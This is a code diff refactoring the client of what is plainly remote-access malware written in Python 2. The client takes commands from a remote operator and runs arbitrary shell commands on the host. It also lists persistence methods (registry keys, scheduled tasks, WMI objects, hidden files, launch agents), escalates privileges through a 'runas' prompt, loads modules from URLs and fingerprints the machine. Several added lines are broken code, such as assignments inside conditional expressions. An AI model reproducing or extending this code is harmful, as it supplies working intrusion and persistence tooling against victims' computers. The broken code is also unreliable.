@@ -80,23 +80,27 @@ else:
 
 
 class Client(object):
-    commands = {}
-    modules  = {}
+    global __commands__
+    global __modules__
+    __commands__ = {}
+    __modules__  = {}
     def __init__(self, *args, **kwargs):
         time.clock()
         self.mode       = 0
         self.exit       = 0
         self.jobs       = {}
-        self.a          = long(kwargs.get('a'))
-        self.b          = long(kwargs.get('b'))
-        self.c          = long(kwargs.get('c'))
-        self.d          = long(kwargs.get('d'))
-        self.e          = long(kwargs.get('e'))
-        self.f          = repr(kwargs.get('f'))
-        self.g          = long(kwargs.get('g'))
-        self.q          = long(kwargs.get('q'))
-        self.s          = long(kwargs.get('s'))
-        self.v          = bool(kwargs.get('v'))
+        self.a          = long(kwargs.get('a')) or long()
+        self.b          = long(kwargs.get('b')) or long()
+        self.c          = long(kwargs.get('c')) or long()
+        self.d          = long(kwargs.get('d')) or long()
+        self.e          = long(kwargs.get('e')) or long()
+        self.f          = repr(kwargs.get('f')) or repr()
+        self.g          = long(kwargs.get('g')) or long()
+        self.q          = long(kwargs.get('q')) or long()
+        self.s          = long(kwargs.get('s')) or long()
+        self.v          = bool(kwargs.get('v')) or bool()
+        self.cmds       = __commands__
+        self.modules    = __modules__
         self.logger     = self._logger()
         self.results    = self._results()
 
@@ -263,8 +267,8 @@ class Client(object):
             if self.v:
                 print 'Powershell error: {}'.format(str(e))
 
-    def _results(self, items=modules):
-        return {module:{} for module in items}
+    def _results(self):
+        return {module:{} for module in self.modules}
 
     def _create_module_from_url(self, uri, name=None):
         name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
@@ -307,11 +311,11 @@ class Client(object):
 
 # ----------------- PUBLIC FUNCTIONS --------------------------
 
-    def command(fx, cx=commands):
+    def command(fx, cx=__commands__):
         cx.update({ fx.func_name : fx })
         return fx
 
-    def module(fx, mx=modules):
+    def module(fx, mx=__modules__):
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}
@@ -372,14 +376,16 @@ class Client(object):
                 ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.f))
             else:
                 return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
+            
     @command
     def run(self):
-        modules = [mod for mod in self.options if self.options[mod].get('status') if sys.platform in self.options[mod].get('platforms') if mod not in self.jobs]
-        for module in modules:
+        mods = [mod for mod in self.modules if self.modules[mod].status if sys.platform in self.modules[mod].platforms if mod not in self.jobs]
+        for module in mods:
             self.jobs[module] = Thread(target=getattr(self, module), name=module)
             self.jobs[module].start()
         if not self.mode:
             return "Tasks complete."
+        
     @command
     def shell(self):
         while True:
@@ -390,8 +396,8 @@ class Client(object):
             data = self._receive()
             cmd, _, action = data.partition(' ')
 
-            if cmd in self.commands:
-                result = self.commands[cmd](action) if len(action) else self.commands[cmd]()
+            if cmd in self.cmds:
+                result = self.cmds[cmd](action) if len(action) else self.cmds[cmd]()
             else:
                 result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
 
@@ -905,16 +911,16 @@ class Client(object):
     def cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
 
     @command
-    def run(self,**kwargs): return self.run.modules()
+    def run(self,**kwargs): return self.run_modules()
 
     @command
     def show(self, target): return self._show(getattr(self, target)) if bool(hasattr(self, target) and target in ('results','jobs')) else 'usage: show <jobs/options/modules>'
 
     @command
-    def use(self, modules): return [self.options.get(module).update({'status': True}) for module in modules.split() if module in self.options]
+    def use(self, module): return self.modules[module].status = True if module in self.modules
 
     @command
-    def stop(self, target): return [self.options.get(module).update({'status': False}) for module in target.split() if module in self.options]    
+    def stop(self, module): return self.modules[module].status = False if module in self.modules    
 
     @command
     def info(self, **args): return {'IP Address': self.ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
@@ -923,7 +929,7 @@ class Client(object):
     def status(self,*args): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))
 
     @command
-    def commands(self, *x): return '\n'.join([cmd for cmd in self.commands])
+    def commands(self, *x): return '\n'.join([cmd for cmd in self.cmds])
 
     @command
     def modules(self, **x): return '\n'.join([mod for mod in self.modules])
